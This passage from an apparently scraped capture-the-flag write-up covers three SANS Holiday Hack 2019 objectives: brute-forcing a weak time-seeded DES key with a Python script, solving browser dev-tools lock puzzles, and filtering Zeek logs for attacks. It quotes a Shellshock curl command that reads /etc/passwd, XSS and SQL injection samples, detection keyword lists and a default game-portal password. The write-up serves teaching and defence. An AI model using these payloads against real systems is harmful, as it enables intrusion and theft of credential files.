full script will be : The full script from Crypto.Cipher import DES from datetime import datetime # Generate Key # December 6, 2019, between 7pm and 9pm UTC. in_file = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc' start_time = '2019-12-06-19-00-00-+0000' end_time = '2019-12-06-21-00-01-+0000' def totimestamp ( t ): t = datetime . strptime ( t , '%Y-%m- %d -%H-%M-%S-%z' ) t = datetime . timestamp ( t ) return int ( t ) start_time = totimestamp ( start_time ) end_time = totimestamp ( end_time ) my_seed = start_time RAND_MAX_32 = 0x7fffffff DES_KEY_SIZE = 8 def my_rand ( seed ): seed = ( seed * 214013 + 2531011 ) & RAND_MAX_32 return seed def make_key ( seed , size ): key = '' for f in range ( size ): seed = my_rand ( seed ) f_seed = ( seed >> 16 ) & 0xFF f_seed = \" %02x \" % f_seed key += f_seed return key # check if pdf def check_pdf ( fin ): if b 'pdf' in fin [: 1000 ]: return True # Decrypt def decrypt ( ciphertext , key ): iv = b ' ' * 8 cipher = DES . new ( key , DES . MODE_CBC , iv ) plaintext = cipher . decrypt ( ciphertext ) return plaintext def decrypt_file ( ciphertext , key , outfile ): dec = decrypt ( ciphertext , key ) if check_pdf ( dec ): with open ( outfile , 'wb' ) as outt : outt . write ( dec ) print ( '******' , outfile , ' is PDF ' , '****** \\n ' + 'Decrypted with key' , f_key , 'and key seed' , my_seed , ' \\n ' 'Creation time: ' , datetime . utcfromtimestamp ( my_seed ) ) exit () with open ( in_file , 'rb' ) as inn : cipher_text = inn . read () i = 1 while my_seed < end_time : f_key = make_key ( my_seed , DES_KEY_SIZE ) print ( i , ' |' , datetime . utcfromtimestamp ( my_seed ) ' | Seed:' , my_seed , '| Key:' , f_key ) my_seed += 1 i += 1 out_file = f_key + '_' + in_file [: - 4 ] ikey = bytes . fromhex ( f_key ) decrypt_file ( cipher_text , ikey , out_file ) Install pycrypto python package to be used in decryption : pip3 install pycrypto Run the script: Decrypted with key b5ad6a321240fbec and key seed 1575663651 Creation time: 2019-12-06 20:20:51 Open the file and get the answer: PDF reader After decrypting the file, Some reader will not be able to open it because at the file beginning pdf not %PDF . You can open the file in the browser and it will open normally. or change the pdf to %PDF at the file beginning. The Answer Machine Learning Sleigh Route Finder Congratulations! You have completed the Recover Cleartext Document challenge! \ud83c\udf89 \ud83c\udf93 What you've learned \u00b6 Reverse Engineering a binary using IDA. Monitor and extract data from network connection using Wireshark. Testing api request/response. srand , rand functions. Building decryption script for DES-CBC algorithm. https://gist.github.com/jamslater/f12cebafd8a2a84bef1e https://rosettacode.org/wiki/Linear_congruential_generator#Python https://pycryptodome.readthedocs.io/en/latest/src/cipher/des.html https://github.com/dlitz/pycrypto/blob/master/lib/Crypto/Cipher/DES.py \u21a9","title":"10  Recover Cleartext Document"},{"location":"objectives/objective10/#10-recover-cleartext-document","text":"Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"10. Recover Cleartext Document"},{"location":"objectives/objective10/#info-hints","text":"Recover Cleartext Document The Elfscrow Crypto tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have debug symbols that you can use. Recover the plaintext content for this encrypted document . We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC. What is the middle line on the cover page? (Hint: it's five words) For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen. Watch> Reverse Engineering https://youtu.be/obJdpKDpFBA What is the middle line on the cover page?","title":"\ud83d\udcdc Info &amp; Hints"},{"location":"objectives/objective10/#solution","text":"Download the files: Elfscrow Crypto debug symbols encrypted document","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective10/#understanding-the-application","text":"The executable is a windows program, You will need to test it on windows machine. Testing on Linux machine You can use wine package to test the executable on Linux machine. sudo apt-get install wine-stable For more info go to https://www.winehq.org/ Running the executable: .\\ elfscrow . exe Welcome to ElfScrow V1.01, the only encryption trusted by Santa! * WARNING: You're reading from stdin. That only partially works, use at your own risk! ** Please pick --encrypt or --decrypt! Are you encrypting a file? Try --encrypt! For example: elfscrow.exe --encrypt <infile> <outfile> You'll be given a secret ID. Keep it safe! The only way to get the file back is to use that secret ID to decrypt it, like this: elfscrow.exe --decrypt --id=<secret_id> <infile> <outfile> You can optionally pass --insecure to use unencrypted HTTP. But if you do that, you'll be vulnerable to packet sniffers such as Wireshark that could potentially snoop on your traffic to figure out what's going on! So we have --insecure to use unencrypted HTTP .. interesting. Encryption: Try to encrypt a test text file with the elfscrow tool to see how it works. .\\ elfscrow . exe - -encrypt unencrypted . txt encrypted . txt . enc The app created a Seed which is look like a timestamp 1578688947 . Try to change it to human readable text and it will give your the time you run the app. Generated an encryption key e8ecf939324a688e with length of 8 bytes using the seed. Sent the key encryption key to https://elfscrow.elfu.org/api/store Returned a1bc0ffb-2a49-42f4-9427-575ccb17dfdb which is a unique uuid by it's format. Decryption: Try to decrypt the file you just encrypted to see how it works. .\\ elfscrow . exe - -decrypt - -id =< secret_id > encrypted . txt . enc decrypted . txt Replace <secret_id> with id you got when encrypted the file. The app retrieve the key from: https://elfscrow.elfu.org/api/retrieve using secret_id . Then decrypted the file using the key. Monitoring the network connections: Now try to encrypt/decrypt the file with option --insecure to use unencrypted connection to the api, So we can monitor and analysis the traffic and verify our findings. Open Wireshark or similar apps to monitor the network traffic and start monitoring the traffic: Run Encryption command .\\ elfscrow . exe - -insecure - -encrypt unencrypted . txt encrypted . txt . enc Then follow HTTP stream to read the POST request headers and body The app send encryption key using POST request to the api The server respond with uuid Run Decryption command .\\ elfscrow . exe - -insecure - -decrypt - -id =< secret_id > encrypted . txt . enc decrypted . txt > Replace <secret_id> with id you got when encrypted the file. Then follow HTTP stream to read the POST request headers and body The app send uuid using POST request to the api The server respond with decryption key Let's try to send correct/wrong data to the api to check the errors: You can use apps like Postman , Insomnia to easily play with HTTP requests. Let's start with storing the key: send an empty POST request to the api https://elfscrow.elfu.org/api/store Invalid key must be 16 hex characters (8 bytes) If you send the correct key format you get the uuid Then try to retrieve the key : send an empty POST request to the api https://elfscrow.elfu.org/api/retrieve Bad identifier must be a UUID If you send the correct uuid format you get the key","title":"Understanding the application:"},{"location":"objectives/objective10/#debug-the-application","text":"In order to decrypt the file we either we have the uuid which is unique and randomly generated to get the key from the api. or regenerate the key and decrypt the file. For this we need the following: seed which is time based and from the hint we know the time range December 6, 2019, between 7pm and 9pm UTC. Key generation function. Encryption function. Let's start with looking at the program binary to find how the key is generated and the file encryption process. 8 bytes Key A key with a fixed length - 7 or 8 bytes usually used fo DES You will need windows machine and debugging program like Ghidra or IDA Windows Virtual Machine You can grab a copy on a Windows 10 a virtual machine from here. https://developer.microsoft.com/en-us/windows/downloads/virtual-machines Open the binary in IDA And make sure to load debug information from .pdb file Select _main function from left panel and Switch to text view: You can scroll down and start reading to find the functions and debugging information. Also we can check functions directly from left panel, We have interesting functions: time super_secure_srand(int) super_secure_random(void) generate_key(uchar * const) do_encrypt(int,char *,char *) do_decrypt(int,char *,char *,char *) store_key(int,uchar * const) retrieve_key(int,uchar * const,char *) Let's start with generate_key function: It calls time and then time returns its return value in EAX then they use EDX as a parameter seed Then calls super_secure_srand(int) function with seed as input_std Do 8 loops for super_secure_random(void) with value from super_secure_srand and each loop it just getting one random byte Return the generated key. Immediately we see the key is based on time and is based on srand. 1 Check super_secure_srand function: We can lookup the function by searching it's name or from the talk void srand ( int x ) { seed = x ; } Check super_secure_random function: Convert the hex values to numeric: We can lookup the function by searching this values or from the talk int rand () { return seed = ( seed * 214013 + 2531011 ) & 32767 ; } Now we can easily generate the key. Check encryption function Get generated the key as mentioned Encrypt using DES-CBC algorithm which confirmed by the key length. Send the key to the api using store_key function Check decryption function Retrive the key from the api using retrieve_key function Decrypt using DES-CBC algorithm which confirmed by the key length.","title":"Debug the application:"},{"location":"objectives/objective10/#decrypting-the-file","text":"We will use python to: Recreate the keys in the time frame December 6, 2019, between 7pm and 9pm UTC . Decrypt the file. Check if the file is not corrupted. Let's begin: Create our time converter to unix, set it as our seed : from datetime import datetime # December 6, 2019, between 7pm and 9pm UTC. start_time = '2019-12-06-19-00-00-+0000' end_time = '2019-12-06-21-00-01-+0000' def totimestamp ( t ): t = datetime . strptime ( t , '%Y-%m- %d -%H-%M-%S-%z' ) t = datetime . timestamp ( t ) return int ( t ) start_time = totimestamp ( start_time ) end_time = totimestamp ( end_time ) my_seed = start_time Generate the key def my_rand ( seed ): seed = ( seed * 214013 + 2531011 ) & RAND_MAX_32 return seed def make_key ( seed , size ): key = '' for f in range ( size ): seed = my_rand ( seed ) f_seed = ( seed >> 16 ) & 0xFF f_seed = \" %02x \" % f_seed key += f_seed return key Decryption function from Crypto.Cipher import DES # Decrypt def decrypt ( ciphertext , key ): iv = b ' ' * 8 cipher = DES . new ( key , DES . MODE_CBC , iv ) plaintext = cipher . decrypt ( ciphertext ) return plaintext We set iv to 0 as it's not specified. Check if the file is PDF or not by searching for pdf at the file beginning: # check if pdf def check_pdf ( fin ): if b 'pdf' in fin [: 1000 ]: return True Decrypt and check the file is PDF then save it: def decrypt_file ( ciphertext , key , outfile ): dec = decrypt ( ciphertext , key ) if check_pdf ( dec ): with open ( outfile , 'wb' ) as outt : outt . write ( dec ) print ( '******' , outfile , ' is PDF ' , '****** \\n ' + 'Decrypted with key' , f_key , 'and key seed' , my_seed , ' \\n ' 'Creation time: ' , datetime . utcfromtimestamp ( my_seed ) ) exit () 6. With the encrypted file open, Run the script and loop through timestamp range: with open ( in_file , 'rb' ) as inn : cipher_text = inn . read () i = 1 while my_seed < end_time : f_key = make_key ( my_seed , DES_KEY_SIZE ) print ( i , ' |' , datetime . utcfromtimestamp ( my_seed ) ' | Seed:' , my_seed , '| Key:' , f_key ) my_seed += 1 i += 1 out_file = f_key + '_' + in_file [: - 4 ] ikey = bytes . fromhex ( f_key ) decrypt_file ( cipher_text , ikey , out_file ) So the full script will be : The full script from Crypto.Cipher import DES from datetime import datetime # Generate Key # December 6, 2019, between 7pm and 9pm UTC. in_file = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc' start_time = '2019-12-06-19-00-00-+0000' end_time = '2019-12-06-21-00-01-+0000' def totimestamp ( t ): t = datetime . strptime ( t , '%Y-%m- %d -%H-%M-%S-%z' ) t = datetime . timestamp ( t ) return int ( t ) start_time = totimestamp ( start_time ) end_time = totimestamp ( end_time ) my_seed = start_time RAND_MAX_32 = 0x7fffffff DES_KEY_SIZE = 8 def my_rand ( seed ): seed = ( seed * 214013 + 2531011 ) & RAND_MAX_32 return seed def make_key ( seed , size ): key = '' for f in range ( size ): seed = my_rand ( seed ) f_seed = ( seed >> 16 ) & 0xFF f_seed = \" %02x \" % f_seed key += f_seed return key # check if pdf def check_pdf ( fin ): if b 'pdf' in fin [: 1000 ]: return True # Decrypt def decrypt ( ciphertext , key ): iv = b ' ' * 8 cipher = DES . new ( key , DES . MODE_CBC , iv ) plaintext = cipher . decrypt ( ciphertext ) return plaintext def decrypt_file ( ciphertext , key , outfile ): dec = decrypt ( ciphertext , key ) if check_pdf ( dec ): with open ( outfile , 'wb' ) as outt : outt . write ( dec ) print ( '******' , outfile , ' is PDF ' , '****** \\n ' + 'Decrypted with key' , f_key , 'and key seed' , my_seed , ' \\n ' 'Creation time: ' , datetime . utcfromtimestamp ( my_seed ) ) exit () with open ( in_file , 'rb' ) as inn : cipher_text = inn . read () i = 1 while my_seed < end_time : f_key = make_key ( my_seed , DES_KEY_SIZE ) print ( i , ' |' , datetime . utcfromtimestamp ( my_seed ) ' | Seed:' , my_seed , '| Key:' , f_key ) my_seed += 1 i += 1 out_file = f_key + '_' + in_file [: - 4 ] ikey = bytes . fromhex ( f_key ) decrypt_file ( cipher_text , ikey , out_file ) Install pycrypto python package to be used in decryption : pip3 install pycrypto Run the script: Decrypted with key b5ad6a321240fbec and key seed 1575663651 Creation time: 2019-12-06 20:20:51 Open the file and get the answer: PDF reader After decrypting the file, Some reader will not be able to open it because at the file beginning pdf not %PDF . You can open the file in the browser and it will open normally. or change the pdf to %PDF at the file beginning. The Answer Machine Learning Sleigh Route Finder Congratulations! You have completed the Recover Cleartext Document challenge! \ud83c\udf89","title":"Decrypting the file"},{"location":"objectives/objective10/#what-youve-learned","text":"Reverse Engineering a binary using IDA. Monitor and extract data from network connection using Wireshark. Testing api request/response. srand , rand functions. Building decryption script for DES-CBC algorithm. https://gist.github.com/jamslater/f12cebafd8a2a84bef1e https://rosettacode.org/wiki/Linear_congruential_generator#Python https://pycryptodome.readthedocs.io/en/latest/src/cipher/des.html https://github.com/dlitz/pycrypto/blob/master/lib/Crypto/Cipher/DES.py \u21a9","title":"\ud83c\udf93 What you've learned"},{"location":"objectives/objective11/","text":"11. Open the Sleigh Shop Door \u00b6 Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83d\udcdc Info & Hints \u00b6 Open the Sleigh Shop Door Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny? For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Kent Tinseltooth By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks. There are funny rhymes, references to perspective, and odd mentions of eggs! And if you think the stuff in your browser looks strange, you should see the page source... Special tools? No, I don't think you'll need any extra tooling for those locks. BUT - I'm pretty sure you'll need to use Chrome's developer tools for that one. Or sorry, you're a Firefox fan? Yeah, Safari's fine too - I just have an ineffible hunger for a physical Esc key. Edge? That's cool. Hm? No no, I was thinking of an unrelated thing. Curl fan? Right on! Just remember: the Windows one doesn't like double quotes. Old school, huh? Oh sure - I've got what you need right here... And I hear the Holiday Hack Trail game will give hints on the last screen if you complete it on Hard. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Shinny Upatree Psst - hey! I'm Shinny Upatree, and I know what's going on! Yeah, that's right - guarding the sleigh shop has made me privvy to some serious, high-level intel. In fact, I know WHO is causing all the trouble. Cindy? Oh no no, not that who. And stop guessing - you'll never figure it out. The only way you could would be if you could break into my crate , here. You see, I've written the villain's name down on a piece of paper and hidden it away securely! Dev Tools Lynx Dev Tools https://xkcd.com/325/ Curl Dev Tools https://curl.haxx.se/docs/manpage.html Edge Dev Tools https://docs.microsoft.com/en-us/microsoft-edge/devtools-guide/console Safari Dev Tools https://developer.apple.com/safari/tools/ Firefox Dev Tools https://developer.mozilla.org/en-US/docs/Tools Chrome Dev Tools https://developers.google.com/web/tools/chrome-devtools Open the Sleigh Shop Door \u26a1\ufe0f Solution \u00b6 Go to https://crate.elfu.org/ I locked the crate with the villain's name inside. Can you get it out? You don't need a clever riddle to open the console and scroll a little. Need a hint? Google: \"[your browser name] developer tools console\" The code is 8 char alphanumeric Open the console in Dev tools and scroll up : Some codes are hard to spy, perhaps they'll show up on pulp with dye? Need a hint? Most paper is made out of pulp. How can you view this page on paper? Emulate print media, print this page, or view a print preview Simulate page printing to view a print preview: or you can inspect other child elements under the question in inspector tab This code is still unknown; it was fetched but never shown. Need a hint? Google: \"[your browser name] view network\" Examine the network requests. Open Network tab in Dev tools and check the images: Where might we keep the things we forage? Yes, of course: Local barrels! Need a hint? Google: \"[your browser name] view local storage\" Go to Storage tab > local storage: Did you notice the code in the title? It may very well prove vital Need a hint? There are several ways to see the full page title: Hovering over this browser tab with your mouse Finding and opening the <title> element in the DOM tree Typing document.title into the console Go to Inspector tab > expand header tag : or Typing document.title into the console: or Hovering over this browser tab with your mouse: In order for this hologram to be effective, it may be necessary to increase your perspective. Need a hint? perspective is a css property. Find the element with this css property and increase the current value. Go to Inspector tab > select the card right to the question > remove perspective property or increase it's value from css panel on the right : The font you're seeing is pretty slick, but this lock's code was my first pick. Need a hint? In the font-family css property, you can list multiple fonts, and the first available font on the system will be used. Go to Inspector tab > Select the question > check font-family property from css panel on the right : In the event that the .eggs go bad, you must figure out who will be sad. Need a hint? Google: \"[your browser name] view event handlers\" Go to Inspector tab > Select the question > Expand to see child elements: Click on event for element with class=\"eggs\" : This next code will be unredacted, but only when all the chakras are :active. Need a hint? :active is a css pseudo class that is applied on elements in an active state. Google: \"[your browser name] force psudo classes\" Go to Inspector tab > Select the question > Expand to see child elements: Select first child with class=\"chakra\" > Select :hov then :active from css panel on the right to see the 1 st part of the code and continue : Oh, no! This lock's out of commission! Pop off the cover and locate what's missing. Need a hint? Use the DOM tree viewer to examine this lock. you can search for items in the DOM using this view. You can click and drag elements to reposition them in the DOM tree. If an action doesn't produce the desired effect, check the console for error output. Be sure to examine that printed circuit board. Go to Inspector tab > Select the last lock > remove element with class=cover : Enter the code KD29XJ37 from the lock board. Check the console tab Error: \"Missing macaroni!\" Lookup element with class .macaroni and drag it inside the locks Check the console tab: Error: \"Missing cotton swab!\" Lookup element with class .swab and drag it inside the locks Check the console tab: Error: \"Missing gnome!\" Lookup element with class .gnome and drag it inside the locks Check the console tab : The Answer The Tooth Fairy Congratulations! You have completed the Open the Sleigh Workshop Door challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Shinny Upatree Wha - what?? You got into my crate?! Well that's embarrassing... But you know what? Hmm... If you're good enough to crack MY security... Do you think you could bring this all to a grand conclusion? Please go into the sleigh shop and see if you can finish this off! Stop the Tooth Fairy from ruining Santa's sleigh route! \ud83c\udf93 What you've learned \u00b6 Using Browser Dev tools. Different between DOM and Page source. Interacting with browser console. Force psudo classes","title":"11  Open the Sleigh Shop Door"},{"location":"objectives/objective11/#11-open-the-sleigh-shop-door","text":"Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84","title":"11. Open the Sleigh Shop Door"},{"location":"objectives/objective11/#info-hints","text":"Open the Sleigh Shop Door Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny? For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Kent Tinseltooth By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks. There are funny rhymes, references to perspective, and odd mentions of eggs! And if you think the stuff in your browser looks strange, you should see the page source... Special tools? No, I don't think you'll need any extra tooling for those locks. BUT - I'm pretty sure you'll need to use Chrome's developer tools for that one. Or sorry, you're a Firefox fan? Yeah, Safari's fine too - I just have an ineffible hunger for a physical Esc key. Edge? That's cool. Hm? No no, I was thinking of an unrelated thing. Curl fan? Right on! Just remember: the Windows one doesn't like double quotes. Old school, huh? Oh sure - I've got what you need right here... And I hear the Holiday Hack Trail game will give hints on the last screen if you complete it on Hard. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Shinny Upatree Psst - hey! I'm Shinny Upatree, and I know what's going on! Yeah, that's right - guarding the sleigh shop has made me privvy to some serious, high-level intel. In fact, I know WHO is causing all the trouble. Cindy? Oh no no, not that who. And stop guessing - you'll never figure it out. The only way you could would be if you could break into my crate , here. You see, I've written the villain's name down on a piece of paper and hidden it away securely! Dev Tools Lynx Dev Tools https://xkcd.com/325/ Curl Dev Tools https://curl.haxx.se/docs/manpage.html Edge Dev Tools https://docs.microsoft.com/en-us/microsoft-edge/devtools-guide/console Safari Dev Tools https://developer.apple.com/safari/tools/ Firefox Dev Tools https://developer.mozilla.org/en-US/docs/Tools Chrome Dev Tools https://developers.google.com/web/tools/chrome-devtools Open the Sleigh Shop Door","title":"\ud83d\udcdc Info &amp; Hints"},{"location":"objectives/objective11/#solution","text":"Go to https://crate.elfu.org/ I locked the crate with the villain's name inside. Can you get it out? You don't need a clever riddle to open the console and scroll a little. Need a hint? Google: \"[your browser name] developer tools console\" The code is 8 char alphanumeric Open the console in Dev tools and scroll up : Some codes are hard to spy, perhaps they'll show up on pulp with dye? Need a hint? Most paper is made out of pulp. How can you view this page on paper? Emulate print media, print this page, or view a print preview Simulate page printing to view a print preview: or you can inspect other child elements under the question in inspector tab This code is still unknown; it was fetched but never shown. Need a hint? Google: \"[your browser name] view network\" Examine the network requests. Open Network tab in Dev tools and check the images: Where might we keep the things we forage? Yes, of course: Local barrels! Need a hint? Google: \"[your browser name] view local storage\" Go to Storage tab > local storage: Did you notice the code in the title? It may very well prove vital Need a hint? There are several ways to see the full page title: Hovering over this browser tab with your mouse Finding and opening the <title> element in the DOM tree Typing document.title into the console Go to Inspector tab > expand header tag : or Typing document.title into the console: or Hovering over this browser tab with your mouse: In order for this hologram to be effective, it may be necessary to increase your perspective. Need a hint? perspective is a css property. Find the element with this css property and increase the current value. Go to Inspector tab > select the card right to the question > remove perspective property or increase it's value from css panel on the right : The font you're seeing is pretty slick, but this lock's code was my first pick. Need a hint? In the font-family css property, you can list multiple fonts, and the first available font on the system will be used. Go to Inspector tab > Select the question > check font-family property from css panel on the right : In the event that the .eggs go bad, you must figure out who will be sad. Need a hint? Google: \"[your browser name] view event handlers\" Go to Inspector tab > Select the question > Expand to see child elements: Click on event for element with class=\"eggs\" : This next code will be unredacted, but only when all the chakras are :active. Need a hint? :active is a css pseudo class that is applied on elements in an active state. Google: \"[your browser name] force psudo classes\" Go to Inspector tab > Select the question > Expand to see child elements: Select first child with class=\"chakra\" > Select :hov then :active from css panel on the right to see the 1 st part of the code and continue : Oh, no! This lock's out of commission! Pop off the cover and locate what's missing. Need a hint? Use the DOM tree viewer to examine this lock. you can search for items in the DOM using this view. You can click and drag elements to reposition them in the DOM tree. If an action doesn't produce the desired effect, check the console for error output. Be sure to examine that printed circuit board. Go to Inspector tab > Select the last lock > remove element with class=cover : Enter the code KD29XJ37 from the lock board. Check the console tab Error: \"Missing macaroni!\" Lookup element with class .macaroni and drag it inside the locks Check the console tab: Error: \"Missing cotton swab!\" Lookup element with class .swab and drag it inside the locks Check the console tab: Error: \"Missing gnome!\" Lookup element with class .gnome and drag it inside the locks Check the console tab : The Answer The Tooth Fairy Congratulations! You have completed the Open the Sleigh Workshop Door challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Shinny Upatree Wha - what?? You got into my crate?! Well that's embarrassing... But you know what? Hmm... If you're good enough to crack MY security... Do you think you could bring this all to a grand conclusion? Please go into the sleigh shop and see if you can finish this off! Stop the Tooth Fairy from ruining Santa's sleigh route!","title":"\u26a1\ufe0f Solution"},{"location":"objectives/objective11/#what-youve-learned","text":"Using Browser Dev tools. Different between DOM and Page source. Interacting with browser console. Force psudo classes","title":"\ud83c\udf93 What you've learned"},{"location":"objectives/objective12/","text":"12. Filter Out Poisoned Sources of Weather Data \u00b6 Difficulty: \ud83c\udf84\ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83d\udcdc Info & Hints \u00b6 Filter Out Poisoned Sources of Weather Data Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa's flight mapping software. Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID (\"RID\") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae. \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Wunorse Openslae Hey, you know what? We've got a crisis here. You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data. All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data! I'm so flummoxed I can't even remember how to login! Hmm... Maybe the Zeek http.log could help us. I worry about LFI , XSS , and SQLi in the Zeek log - oh my! And I'd be shocked if there weren't some shell stuff in there too. I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall. If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs. The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route. Try not to block many legitimate weather station IPs as that could also cause route calculation failure. Remember, when looking at JSON data, jq is the tool for you! Finding Bad in Web Logs Do you see any LFI , XSS , Shellshock , or SQLi ? \ud83e\uddda\ud83c\udffb\u200d\u200d The Tooth Fairy I\u2019m the Tooth Fairy, the mastermind behind the plot to destroy the holiday season. I hate how Santa is so beloved, but only works one day per year! He has all of the resources of the North Pole and the elves to help him too. I run a solo operation, toiling year-round collecting deciduous bicuspids and more from children. But I get nowhere near the gratitude that Santa gets. He needs to share his holiday resources with the rest of us! But, although you found me, you haven\u2019t foiled my plot! Santa\u2019s sleigh will NOT be able to find its way. I will get my revenge and respect! I want my own holiday, National Tooth Fairy Day, to be the most popular holiday on the calendar!!! \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Krampus But there\u2019s still time! Solve the final challenge in your badge by blocking the bad IPs at srf.elfu.org and save the holiday season! Block the 100 offending sources of information & Submit (\"RID\") success value \u26a1\ufe0f Solution \u00b6 Getting the logins to the SRF portal \u00b6 As we know from objective #10 : The default login credentials should be changed on startup and can be found in the readme in the ElfU Research Labs git repository. Any git repository start with README.md we can test at the url directly. or we can search the logs for event without status_code 404 which means not found cat http.log | jq '.[] | select((.uri | contains(\"README\")) and (.status_code != 404)) | .uri ' Grab it from the portal: https://srf.elfu.org/README.md # Sled-O-Matic - Sleigh Route Finder Web API ### Installation `sudo apt install python3-pip` `sudo python3 -m pip install -r requirements.txt` #### Running: `python3 ./srfweb.py` #### Logging in: You can login using the default admin pass: `admin 924158F9522B3744F5FCD4D10FAC4356` However, it's recommended to change this in the sqlite db to something custom. Understanding the API & the logs \u00b6 Log to the SRF portal using the credentials we found: username: admin password: 924158F9522B3744F5FCD4D10FAC4356 The SLEIGH ROUTE FINDER API portal Open the API Docs To Update The Measurements For a Specific Global Elf Weather Station: HTTP POST REQUEST TO -http://srf.elfu.org/api/measurements HTTP HEADER OF-Content-Type: application/json API Request All StationIDS: HTTP GET REQUEST -http://srf.elfu.org/api/stationsAPI Request All Stations Weather Data: HTTP GET REQUEST -http://srf.elfu.org/api/weather?station_id=* API Request One Stations Weather Data: HTTP GET REQUEST -http://srf.elfu.org/api/weather?station_id=abcd1234API Request Multiple Specific StationsWeatherData: HTTP GET REQUEST -http://srf.elfu.org/api/weather?station_id=abcd1234,abcd1235 It's important to understand the correct url/requests for api. Look at first entry structure: 3 to understand the content of each object in the logs. 1 cat http.log | jq '.[0]' { \"ts\" : \"2019-10-05T06:50:42-0800\" , \"uid\" : \"ClRV8h1vYKWXN1G5ke\" , \"id.orig_h\" : \"238.27.231.56\" , \"id.orig_p\" : 60677 , \"id.resp_h\" : \"10.20.3.80\" , \"id.resp_p\" : 80 , \"trans_depth\" : 1 , \"method\" : \"GET\" , \"host\" : \"srf.elfu.org\" , \"uri\" : \"/14.10/Google/\" , \"referrer\" : \"-\" , \"version\" : \"1.0\" , \"user_agent\" : \"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729)\" , \"origin\" : \"-\" , \"request_body_len\" : 0 , \"response_body_len\" : 232 , \"status_code\" : 404 , \"status_msg\" : \"Not Found\" , \"info_code\" : \"-\" , \"info_msg\" : \"-\" , \"tags\" : \"(empty)\" , \"username\" : \"-\" , \"password\" : \"-\" , \"proxied\" : \"-\" , \"orig_fuids\" : \"-\" , \"orig_filenames\" : \"-\" , \"orig_mime_types\" : \"-\" , \"resp_fuids\" : \"FUPWLQXTNsTNvf33\" , \"resp_filenames\" : \"-\" , \"resp_mime_types\" : \"text/html\" } We have interesting parameters host , uri , user_agent , status_code , username . and we can search for unique values in each, for example: cat http.log | jq '.[] | .username ' | sort | uniq \"' or '1=1\" \"(empty)\" \"-\" \"-r nessus\" \"6666\" \"Admin\" \"admin\" \"comcomcom\" \"q1ki9\" \"root\" \"servlet\" \"support\" This well help us searching and pivoting for each attack in the next step. Searching for attacks \u00b6 Local File Inclusion (LFI): The File Inclusion vulnerability allows an attacker to include a file, that are already locally present on the server. And it's occurs when paths passed to \"include\" statements are not properly sanitized. 2 Typical proof-of-concept would be to load passwd file. So we will to search for .. , /etc , || , pass in uri . cat http.log | jq '.[] | select ( .uri | contains(\"..\",\"/etc\",\"||\",\"pass\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv .[\"id.orig_h\"] return source ip sort sort result uniq remove duplicates &>> detected_ips.csv add result to csv file Cross-Site Scripting (XSS): Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. Since the XSS attacks may be conducted without using <script></script> tags. Other tags will do exactly the same thing: 2 <body onload=alert('test1')> So we will to search for < in uri and host . cat http.log | jq '.[] | select ( .uri | contains(\"<\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .host | contains(\"<\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv Shellshock: Shellshock is a family of security bugs[2] in the Unix Bash shell 3 , that use the User-Agent string to attack. Example of Execution curl -A '() { :;}; echo \"Content-Type: text/plain\"; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status > passwd So we will to search for the string () { :; }; in uri , host , user_agent cat http.log | jq '.[] | select ( .user_agent | contains(\"() { :; };\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv SQLi: A SQL injection attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. 2 We will search for /* , ** , UNION , ' in uri , host , username , user_agent cat http.log | jq '.[] | select ( .uri | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .host | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .username | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] 